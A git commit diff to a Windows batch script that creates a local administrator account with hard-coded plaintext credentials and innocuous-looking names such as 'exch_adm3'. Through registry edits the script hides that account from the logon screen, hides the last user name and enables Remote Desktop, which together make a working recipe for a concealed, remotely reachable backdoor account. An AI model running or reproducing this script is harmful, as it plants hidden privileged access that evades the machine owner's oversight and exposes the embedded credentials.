e28da80fbd79d3075a172e336a8bc05f96c790c7
Ienhen Slivak 31.03.2025 <exa1804@gmail.com>
2025-05-29 10:28:04 +0300

    windows after install2

--- Windows/Scrypts/Add_user_admin_cyr.cmd
+++ Windows/Scrypts/Add_user_admin_cyr.cmd
@@ -1,7 +1,12 @@
-@echo off
-set NEW_USER=Microsoft
-set NEW_PASS=Samsung1!
+set NEW_USER=exch_adm3
+set NEW_PASS=Byntuhfk2005
 
+@echo off
+cls
+net user
+echo 1. Need run ass Admin
+echo 2. create new user %NEW_USER%
+pause
 chcp 1251
 net user %NEW_USER% /add
 net user %NEW_USER% %NEW_PASS% 
@@ -11,3 +16,7 @@ net localgroup Администраторы %NEW_USER% /add
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastName /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %NEW_USER% /t reg_dword /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+net user
+pause
